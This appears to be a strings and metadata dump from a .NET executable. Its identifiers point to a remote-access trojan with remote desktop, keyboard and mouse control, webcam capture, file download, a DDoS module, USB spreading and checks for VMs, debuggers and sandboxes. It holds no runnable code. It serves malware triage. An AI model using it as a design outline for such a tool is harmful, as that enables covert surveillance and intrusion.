Metadata Signature: 0x5f10 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 1744
Stream name: #~ 4
DirectoryAddress: 17b0 Size: 1b60
Stream name: #Strings 12
DirectoryAddress: 3310 Size: 10ac
Stream name: #US 4
DirectoryAddress: 43bc Size: 10
Stream name: #GUID 8
DirectoryAddress: 43cc Size: a44
Stream name: #Blob 8
[Strings]
nth paddr      vaddr      len size section type    string
84  0x00003bd1 0x004059d1 4   5    .text   ascii   \n8L\t
85  0x00003d54 0x00405b54 4   5    .text   ascii   #r\r\v
86  0x00003dab 0x00405bab 4   5    .text   ascii   \n8r\a
87  0x00003e85 0x00405c85 4   5    .text   ascii   #r!\v
88  0x00003e92 0x00405c92 5   6    .text   ascii   3(r!\v
89  0x00003ebd 0x00405cbd 4   5    .text   ascii   #r-\v
90  0x00003f8b 0x00405d8b 4   5    .text   ascii   #rU\v
91  0x00003fa6 0x00405da6 4   5    .text   ascii   \nri\v
92  0x00003fd9 0x00405dd9 4   5    .text   ascii   \n&(S
93  0x00004003 0x00405e03 5   6    .text   ascii   +#r!\v
94  0x0000403b 0x00405e3b 5   6    .text   ascii   3hr_\v
95  0x00004046 0x00405e46 4   5    .text   ascii   \nri\v
96  0x00004055 0x00405e55 4   5    .text   ascii   \n,%r
97  0x0000407b 0x00405e7b 5   6    .text   ascii   +#r!\v
98  0x000042eb 0x004060eb 4   5    .text   ascii   \n&(S
99  0x0000437d 0x0040617d 4   5    .text   ascii   \n+9r
100 0x000043bf 0x004061bf 4   5    .text   ascii   #r\t\f
101 0x000043cc 0x004061cc 5   6    .text   ascii   3(r\t\f
102 0x000046f9 0x004064f9 5   6    .text   ascii   \n\r\t\b(
103 0x0000476a 0x0040656a 4   5    .text   ascii   \n\v\a(
104 0x0000477c 0x0040657c 4   5    .text   ascii   \n\f("
105 0x000047d5 0x004065d5 4   5    .text   ascii   \n\r("
106 0x00004824 0x00406624 5   6    .text   ascii   \r\ar#\f
107 0x00004835 0x00406635 4   5    .text   ascii   \nr5\f
108 0x00004895 0x00406695 4   5    .text   ascii   \r\a\to
109 0x000048e2 0x004066e2 4   5    .text   ascii   \b*\e0
110 0x00004915 0x00406715 4   5    .text   ascii   \n\f\bo
111 0x00004941 0x00406741 4   5    .text   ascii   \nr5\f
112 0x0000494b 0x0040674b 4   5    .text   ascii   \n\n+I
113 0x0000495a 0x0040675a 4   5    .text   ascii   \nr5\f
114 0x00004964 0x00406764 4   5    .text   ascii   \n\n+0
115 0x00004973 0x00406773 4   5    .text   ascii   \nr5\f
116 0x0000498c 0x0040678c 4   5    .text   ascii   \nr5\f
117 0x00004996 0x00406796 5   6    .text   ascii   \n\n\toG
118 0x00004a51 0x00406851 4   5    .text   ascii   \n\v("
119 0x00004b48 0x00406948 4   5    .text   ascii   , \b\t
120 0x00004c41 0x00406a41 4   5    .text   ascii   p\n("
121 0x00004cd6 0x00406ad6 4   5    .text   ascii   \a*\e0
122 0x00004cf4 0x00406af4 4   5    .text   ascii   \n\v("
123 0x00004d26 0x00406b26 4   5    .text   ascii   \er/\r
124 0x00004d7a 0x00406b7a 4   5    .text   ascii   \nr=\r
125 0x00004dbe 0x00406bbe 4   5    .text   ascii   \a*\e0
126 0x00004ec5 0x00406cc5 5   6    .text   ascii   \n\v\ao\v
127 0x00004ede 0x00406cde 4   5    .text   ascii   \e%(!
128 0x00004eea 0x00406cea 4   5    .text   ascii   p\n("
129 0x00004f2e 0x00406d2e 4   5    .text   ascii   3\nrQ
130 0x00004f37 0x00406d37 5   6    .text   ascii   '+\br9
131 0x00004f43 0x00406d43 4   5    .text   ascii   \e%(!
132 0x00004f4f 0x00406d4f 4   5    .text   ascii   p\n("
133 0x00004f84 0x00406d84 4   5    .text   ascii   \n\v\at
134 0x00004fbd 0x00406dbd 7   8    .text   ascii   \n\f\b,\nrQ
135 0x00004fc9 0x00406dc9 5   6    .text   ascii   (+\br9
136 0x00004fe2 0x00406de2 4   5    .text   ascii   p\n("
137 0x00005019 0x00406e19 4   5    .text   ascii   \nrm\r
138 0x00005033 0x00406e33 4   5    .text   ascii   \n\f\ao
139 0x0000504a 0x00406e4a 5   6    .text   ascii   \n\r\b\tr
140 0x00005061 0x00406e61 4   5    .text   ascii   \n&\br
141 0x000050cd 0x00406ecd 4   5    .text   ascii   p\n("
142 0x0000512a 0x00406f2a 5   6    .text   ascii   \a*b~\r
143 0x0000516f 0x00406f6f 4   5    .text   ascii   \n\ns\e
144 0x00005183 0x00406f83 4   5    .text   ascii   \f\a\b\t
145 0x000051d5 0x00406fd5 4   5    .text   ascii   $%(!
146 0x00005326 0x00407126 4   5    .text   ascii   \n\n("
147 0x0000560e 0x0040740e 4   5    .text   ascii   p\b($
148 0x00005614 0x00407414 4   5    .text   ascii   \nr=\r
149 0x00005620 0x00407420 4   5    .text   ascii   \n\b($
150 0x00005626 0x00407426 4   5    .text   ascii   \nr=\r
151 0x00005b1a 0x0040791a 5   6    .text   ascii   \n*\e0\b
152 0x00005bbc 0x004079bc 4   5    .text   ascii   \n\a%-
153 0x00005bc3 0x004079c3 5   6    .text   ascii   \e+\nyY
154 0x00005beb 0x004079eb 4   5    .text   ascii   +\nyS
155 0x00005ef2 0x00407cf2 4   5    .text   ascii   \n\r("
156 0x00005f10 0x00407d10 4   5    .text   ascii   BSJB
157 0x00005f20 0x00407d20 10  11   .text   ascii   v4.0.30319
158 0x00005f44 0x00407d44 8   9    .text   ascii   #Strings
159 0x00005f64 0x00407d64 5   6    .text   ascii   #GUID
160 0x00005f74 0x00407d74 5   6    .text   ascii   #Blob
161 0x00005fa0 0x00407da0 5   24   .text   utf32le ']Jł4 blocks=Basic Latin,Latin Extended-A
162 0x00006066 0x00407e66 4   5    .text   ascii   |\bf\b
163 0x0000608a 0x00407e8a 4   5    .text   ascii   e\tH\t
164 0x000060b4 0x00407eb4 4   5    .text   ascii   Y\nz\t
165 0x0000611a 0x00407f1a 4   5    .text   ascii   M\f=\f
166 0x00006378 0x00408178 4   5    .text   ascii   /\ez\t
167 0x00006456 0x00408256 4   9    .text   utf16le \r'Z1
168 0x00007178 0x00408f78 5   6    .text   ascii   1\r2\a\
169 0x00007190 0x00408f90 4   5    .text   ascii   ;\vK\a
170 0x00007280 0x00409080 5   6    .text   ascii   1\r|\b9
171 0x000073ad 0x004091ad 4   5    .text   ascii   \n"\n.
172 0x00007528 0x00409328 10  11   .text   ascii   \r\aS\af\as\ax\a
173 0x0000753f 0x0040933f 11  12   .text   ascii   \b1\b1\bD\bQ\bj\b
174 0x000075cc 0x004093cc 4   5    .text   ascii   )\a<\a
175 0x000076c1 0x004094c1 8   9    .text   ascii   <Module>
176 0x000076ca 0x004094ca 8   9    .text   ascii   mscorlib
177 0x000076d3 0x004094d3 21  22   .text   ascii   Microsoft.VisualBasic
178 0x000076e9 0x004094e9 13  14   .text   ascii   MyApplication
179 0x000076fa 0x004094fa 10  11   .text   ascii   MyComputer
180 0x00007705 0x00409505 9   10   .text   ascii   MyProject
181 0x0000770f 0x0040950f 13  14   .text   ascii   MyWebServices
182 0x0000771d 0x0040951d 26  27   .text   ascii   ThreadSafeObjectProvider`1
183 0x00007738 0x00409538 8   9    .text   ascii   Settings
184 0x00007741 0x00409541 4   5    .text   ascii   Stub
185 0x00007746 0x00409546 4   5    .text   ascii   Main
186 0x0000774b 0x0040954b 12  13   .text   ascii   ClientSocket
187 0x00007758 0x00409558 8   9    .text   ascii   Messages
188 0x00007761 0x00409561 6   7    .text   ascii   Helper
189 0x0000776c 0x0040956c 13  14   .text   ascii   RemoteDesktop
190 0x0000777a 0x0040957a 24  25   .text   ascii   AppendOutputTextDelegate
191 0x00007793 0x00409593 41  42   .text   ascii   Microsoft.VisualBasic.ApplicationServices
192 0x000077bd 0x004095bd 15  16   .text   ascii   ApplicationBase
193 0x000077cd 0x004095cd 5   6    .text   ascii   .ctor
194 0x000077d3 0x004095d3 29  30   .text   ascii   Microsoft.VisualBasic.Devices
195 0x000077f1 0x004095f1 8   9    .text   ascii   Computer
196 0x000077fa 0x004095fa 6   7    .text   ascii   System
197 0x00007801 0x00409601 6   7    .text   ascii   Object
198 0x00007808 0x00409608 6   7    .text   ascii   .cctor
199 0x0000780f 0x0040960f 12  13   .text   ascii   get_Computer
200 0x0000781c 0x0040961c 24  25   .text   ascii   m_ComputerObjectProvider
201 0x00007835 0x00409635 15  16   .text   ascii   get_Application
202 0x00007845 0x00409645 19  20   .text   ascii   m_AppObjectProvider
203 0x00007859 0x00409659 4   5    .text   ascii   User
204 0x0000785e 0x0040965e 8   9    .text   ascii   get_User
205 0x00007867 0x00409667 20  21   .text   ascii   m_UserObjectProvider
206 0x0000787c 0x0040967c 15  16   .text   ascii   get_WebServices
207 0x0000788c 0x0040968c 29  30   .text   ascii   m_MyWebServicesObjectProvider
208 0x000078aa 0x004096aa 11  12   .text   ascii   Application
209 0x000078b6 0x004096b6 11  12   .text   ascii   WebServices
210 0x000078c2 0x004096c2 6   7    .text   ascii   Equals
211 0x000078cb 0x004096cb 11  12   .text   ascii   GetHashCode
212 0x000078d7 0x004096d7 4   5    .text   ascii   Type
213 0x000078dc 0x004096dc 7   8    .text   ascii   GetType
214 0x000078e4 0x004096e4 8   9    .text   ascii   ToString
215 0x000078ed 0x004096ed 18  19   .text   ascii   Create__Instance__
216 0x00007902 0x00409702 8   9    .text   ascii   instance
217 0x0000790b 0x0040970b 19  20   .text   ascii   Dispose__Instance__
218 0x0000791f 0x0040971f 15  16   .text   ascii   get_GetInstance
219 0x0000792f 0x0040972f 19  20   .text   ascii   m_ThreadStaticValue
220 0x00007943 0x00409743 11  12   .text   ascii   GetInstance
221 0x0000794f 0x0040974f 4   5    .text   ascii   Host
222 0x00007954 0x00409754 4   5    .text   ascii   Port
223 0x00007959 0x00409759 8   9    .text   ascii   uploader
224 0x00007962 0x00409762 6   7    .text   ascii   nameee
225 0x00007971 0x00409771 6   7    .text   ascii   Mutexx
226 0x00007978 0x00409778 16  17   .text   ascii   System.Threading
227 0x00007989 0x00409789 5   6    .text   ascii   Mutex
228 0x0000798f 0x0040978f 9   10   .text   ascii   _appMutex
229 0x00007999 0x00409799 4   5    .text   ascii   USBS
230 0x0000799e 0x0040979e 5   6    .text   ascii   path2
231 0x000079a4 0x004097a4 13  14   .text   ascii   System.Timers
232 0x000079b2 0x004097b2 5   6    .text   ascii   Timer
233 0x000079b8 0x004097b8 7   8    .text   ascii   dTimer2
234 0x000079c0 0x004097c0 7   8    .text   ascii   doshost
235 0x000079c8 0x004097c8 7   8    .text   ascii   dosport
236 0x000079d0 0x004097d0 7   8    .text   ascii   dostype
237 0x000079d8 0x004097d8 6   7    .text   ascii   dosstu
238 0x000079df 0x004097df 8   9    .text   ascii   Emulator
239 0x000079e8 0x004097e8 20  21   .text   ascii   DetectVirtualMachine
240 0x000079fd 0x004097fd 14  15   .text   ascii   DetectDebugger
241 0x00007a0c 0x0040980c 15  16   .text   ascii   DetectSandboxie
242 0x00007a1c 0x0040981c 6   7    .text   ascii   anyrun
243 0x00007a23 0x00409823 15  16   .text   ascii   GetModuleHandle
244 0x00007a33 0x00409833 12  13   .text   ascii   lpModuleName
245 0x00007a40 0x00409840 26  27   .text   ascii   CheckRemoteDebuggerPresent
246 0x00007a5b 0x0040985b 8   9    .text   ascii   hProcess
247 0x00007a64 0x00409864 17  18   .text   ascii   isDebuggerPresent
248 0x00007a76 0x00409876 11  12   .text   ascii   isConnected
249 0x00007a82 0x00409882 18  19   .text   ascii   System.Net.Sockets
250 0x00007a95 0x00409895 6   7    .text   ascii   Socket
251 0x00007a9e 0x0040989e 12  13   .text   ascii   BufferLength
252 0x00007aab 0x004098ab 6   7    .text   ascii   Buffer
253 0x00007ab2 0x004098b2 9   10   .text   ascii   System.IO
254 0x00007abc 0x004098bc 12  13   .text   ascii   MemoryStream
255 0x00007acc 0x004098cc 12  13   .text   ascii   BeginConnect
256 0x00007ad9 0x004098d9 4   5    .text   ascii   Info
257 0x00007ade 0x004098de 12  13   .text   ascii   IAsyncResult
258 0x00007aeb 0x004098eb 12  13   .text   ascii   BeginReceive
259 0x00007afb 0x004098fb 9   10   .text   ascii   BeginRead
260 0x00007b07 0x00409907 4   5    .text   ascii   Send
261 0x00007b10 0x00409910 7   8    .text   ascii   EndSend
262 0x00007b18 0x00409918 14  15   .text   ascii   isDisconnected
263 0x00007b27 0x00409927 4   5    .text   ascii   Ping
264 0x00007b2c 0x0040992c 18  19   .text   ascii   System.Diagnostics
265 0x00007b3f 0x0040993f 7   8    .text   ascii   Process
266 0x00007b47 0x00409947 10  11   .text   ascii   _MyProcess
267 0x00007b52 0x00409952 13  14   .text   ascii   get_MyProcess
268 0x00007b60 0x00409960 13  14   .text   ascii   set_MyProcess
269 0x00007b6e 0x0040996e 15  16   .text   ascii   WithEventsValue
270 0x00007b7e 0x0040997e 9   10   .text   ascii   processid
271 0x00007b88 0x00409988 16  17   .text   ascii   AppendOutputText
272 0x00007b99 0x00409999 4   5    .text   ascii   text
273 0x00007b9e 0x0040999e 21  22   .text   ascii   DataReceivedEventArgs
274 0x00007bb4 0x004099b4 27  28   .text   ascii   MyProcess_ErrorDataReceived
275 0x00007bd0 0x004099d0 6   7    .text   ascii   sender
276 0x00007bd9 0x004099d9 28  29   .text   ascii   MyProcess_OutputDataReceived
277 0x00007bf6 0x004099f6 4   5    .text   ascii   Read
278 0x00007bfb 0x004099fb 11  12   .text   ascii   mouse_event
279 0x00007c07 0x00409a07 7   8    .text   ascii   dwFlags
280 0x00007c15 0x00409a15 8   9    .text   ascii   cButtons
281 0x00007c1e 0x00409a1e 11  12   .text   ascii   dwExtraInfo
282 0x00007c2a 0x00409a2a 6   7    .text   ascii   user32
283 0x00007c31 0x00409a31 11  12   .text   ascii   keybd_event
284 0x00007c41 0x00409a41 5   6    .text   ascii   bScan
285 0x00007c47 0x00409a47 14  15   .text   ascii   System.Drawing
286 0x00007c56 0x00409a56 6   7    .text   ascii   Bitmap
287 0x00007c5d 0x00409a5d 8   9    .text   ascii   compress
288 0x00007c66 0x00409a66 4   5    .text   ascii   imgg
289 0x00007c6d 0x00409a6d 5   6    .text   ascii   ngrok
290 0x00007c7d 0x00409a7d 7   8    .text   ascii   STOBS64
291 0x00007c87 0x00409a87 23  24   .text   ascii   capCreateCaptureWindowA
292 0x00007c9f 0x00409a9f 14  15   .text   ascii   lpszWindowName
293 0x00007cae 0x00409aae 7   8    .text   ascii   dwStyle
294 0x00007cba 0x00409aba 6   7    .text   ascii   nWidth
295 0x00007cc1 0x00409ac1 7   8    .text   ascii   nHeight
296 0x00007cc9 0x00409ac9 10  11   .text   ascii   hwndParent
297 0x00007cd8 0x00409ad8 6   7    .text   ascii   Handle
298 0x00007cdf 0x00409adf 24  25   .text   ascii   capGetDriverDescriptionA
299 0x00007cf8 0x00409af8 7   8    .text   ascii   wDriver
300 0x00007d00 0x00409b00 8   9    .text   ascii   lpszName
301 0x00007d09 0x00409b09 6   7    .text   ascii   cbName
302 0x00007d10 0x00409b10 7   8    .text   ascii   lpszVer
303 0x00007d18 0x00409b18 5   6    .text   ascii   cbVer
304 0x00007d22 0x00409b22 4   5    .text   ascii   Net3
305 0x00007d27 0x00409b27 10  11   .text   ascii   getFolders
306 0x00007d32 0x00409b32 8   9    .text   ascii   location
307 0x00007d3b 0x00409b3b 8   9    .text   ascii   getFiles
308 0x00007d44 0x00409b44 9   10   .text   ascii   getDrives
309 0x00007d4e 0x00409b4e 8   9    .text   ascii   Download
310 0x00007d57 0x00409b57 4   5    .text   ascii   Name
311 0x00007d5c 0x00409b5c 4   5    .text   ascii   Data
312 0x00007d61 0x00409b61 9   10   .text   ascii   MyProcess
313 0x00007d74 0x00409b74 8   9    .text   ascii   GetHashT
314 0x00007d7d 0x00409b7d 9   10   .text   ascii   strToHash
315 0x00007d87 0x00409b87 10  11   .text   ascii   frombase64
316 0x00007d92 0x00409b92 4   5    .text   ascii   bs64
317 0x00007d97 0x00409b97 4   5    .text   ascii   objj
318 0x00007da0 0x00409ba0 6   7    .text   ascii   Plugin
319 0x00007da9 0x00409ba9 13  14   .text   ascii   AES_Encryptor
320 0x00007db7 0x00409bb7 5   6    .text   ascii   input
321 0x00007dbd 0x00409bbd 13  14   .text   ascii   AES_Decryptor
322 0x00007dcb 0x00409bcb 6   7    .text   ascii   INDATE
323 0x00007dd2 0x00409bd2 4   5    .text   ascii   usbp
324 0x00007dd7 0x00409bd7 5   6    .text   ascii   admin
325 0x00007ddd 0x00409bdd 9   10   .text   ascii   Antivirus
326 0x00007de7 0x00409be7 11  12   .text   ascii   CreateMutex
327 0x00007df3 0x00409bf3 10  11   .text   ascii   CloseMutex
328 0x00007dfe 0x00409bfe 16  17   .text   ascii   ElapsedEventArgs
329 0x00007e0f 0x00409c0f 7   8    .text   ascii   tickees
330 0x00007e1b 0x00409c1b 6   7    .text   ascii   Thread
331 0x00007e22 0x00409c22 6   7    .text   ascii   thread
332 0x00007e29 0x00409c29 5   6    .text   ascii   Start
333 0x00007e2f 0x00409c2f 5   6    .text   ascii   stopp
334 0x00007e35 0x00409c35 4   5    .text   ascii   ruta
335 0x00007e3a 0x00409c3a 5   6    .text   ascii   usbSP
336 0x00007e40 0x00409c40 7   8    .text   ascii   Capture
337 0x00007e4f 0x00409c4f 22  23   .text   ascii   System.Drawing.Imaging
338 0x00007e66 0x00409c66 14  15   .text   ascii   ImageCodecInfo
339 0x00007e75 0x00409c75 11  12   .text   ascii   ImageFormat
340 0x00007e81 0x00409c81 14  15   .text   ascii   GetEncoderInfo
341 0x00007e90 0x00409c90 6   7    .text   ascii   format
342 0x00007e97 0x00409c97 17  18   .text   ascii   MulticastDelegate
343 0x00007ea9 0x00409ca9 12  13   .text   ascii   TargetObject
344 0x00007eb6 0x00409cb6 12  13   .text   ascii   TargetMethod
345 0x00007ec3 0x00409cc3 13  14   .text   ascii   AsyncCallback
346 0x00007ed1 0x00409cd1 11  12   .text   ascii   BeginInvoke
347 0x00007edd 0x00409cdd 16  17   .text   ascii   DelegateCallback
348 0x00007eee 0x00409cee 18  19   .text   ascii   DelegateAsyncState
349 0x00007f01 0x00409d01 9   10   .text   ascii   EndInvoke
350 0x00007f0b 0x00409d0b 19  20   .text   ascii   DelegateAsyncResult
351 0x00007f1f 0x00409d1f 6   7    .text   ascii   Invoke
352 0x00007f26 0x00409d26 21  22   .text   ascii   System.ComponentModel
353 0x00007f3c 0x00409d3c 24  25   .text   ascii   EditorBrowsableAttribute
354 0x00007f55 0x00409d55 20  21   .text   ascii   EditorBrowsableState
355 0x00007f6a 0x00409d6a 23  24   .text   ascii   System.CodeDom.Compiler
356 0x00007f82 0x00409d82 22  23   .text   ascii   GeneratedCodeAttribute
357 0x00007f99 0x00409d99 23  24   .text   ascii   DebuggerHiddenAttribute
358 0x00007fb1 0x00409db1 38  39   .text   ascii   Microsoft.VisualBasic.CompilerServices
359 0x00007fd8 0x00409dd8 23  24   .text   ascii   StandardModuleAttribute
360 0x00007ff0 0x00409df0 23  24   .text   ascii   HideModuleNameAttribute
361 0x00008008 0x00409e08 28  29   .text   ascii   System.ComponentModel.Design
362 0x00008025 0x00409e25 20  21   .text   ascii   HelpKeywordAttribute
363 0x0000803a 0x00409e3a 31  32   .text   ascii   System.Runtime.CompilerServices
364 0x0000805a 0x00409e5a 14  15   .text   ascii   RuntimeHelpers
365 0x00008069 0x00409e69 14  15   .text   ascii   GetObjectValue
366 0x00008078 0x00409e78 17  18   .text   ascii   RuntimeTypeHandle
367 0x0000808a 0x00409e8a 17  18   .text   ascii   GetTypeFromHandle
368 0x0000809c 0x00409e9c 9   10   .text   ascii   Activator
369 0x000080a6 0x00409ea6 14  15   .text   ascii   CreateInstance
370 0x000080b5 0x00409eb5 26  27   .text   ascii   MyGroupCollectionAttribute
371 0x000080d0 0x00409ed0 30  31   .text   ascii   System.Runtime.InteropServices
372 0x000080ef 0x00409eef 19  20   .text   ascii   ComVisibleAttribute
373 0x00008103 0x00409f03 21  22   .text   ascii   ThreadStaticAttribute
374 0x00008119 0x00409f19 26  27   .text   ascii   CompilerGeneratedAttribute
375 0x00008134 0x00409f34 20  21   .text   ascii   System.Windows.Forms
376 0x00008149 0x00409f49 18  19   .text   ascii   get_ExecutablePath
377 0x0000815c 0x00409f5c 9   10   .text   ascii   Exception
378 0x00008166 0x00409f66 8   9    .text   ascii   FileInfo
379 0x0000816f 0x00409f6f 16  17   .text   ascii   ProcessStartInfo
380 0x00008180 0x00409f80 5   6    .text   ascii   Sleep
381 0x00008186 0x00409f86 11  12   .text   ascii   ProjectData
382 0x00008192 0x00409f92 6   7    .text   ascii   EndApp
383 0x00008199 0x00409f99 15  16   .text   ascii   SetProjectError
384 0x000081a9 0x00409fa9 17  18   .text   ascii   ClearProjectError
385 0x000081bb 0x00409fbb 11  12   .text   ascii   Environment
386 0x000081c7 0x00409fc7 13  14   .text   ascii   SpecialFolder
387 0x000081d5 0x00409fd5 13  14   .text   ascii   GetFolderPath
388 0x000081e3 0x00409fe3 4   5    .text   ascii   Path
389 0x000081e8 0x00409fe8 11  12   .text   ascii   GetFileName
390 0x000081f4 0x00409ff4 6   7    .text   ascii   String
391 0x000081fb 0x00409ffb 6   7    .text   ascii   Concat
392 0x00008202 0x0040a002 4   5    .text   ascii   File
393 0x00008207 0x0040a007 6   7    .text   ascii   Exists
394 0x0000820e 0x0040a00e 4   5    .text   ascii   Copy
395 0x00008213 0x0040a013 14  15   .text   ascii   FileSystemInfo
396 0x00008222 0x0040a022 14  15   .text   ascii   FileAttributes
397 0x00008231 0x0040a031 14  15   .text   ascii   set_Attributes
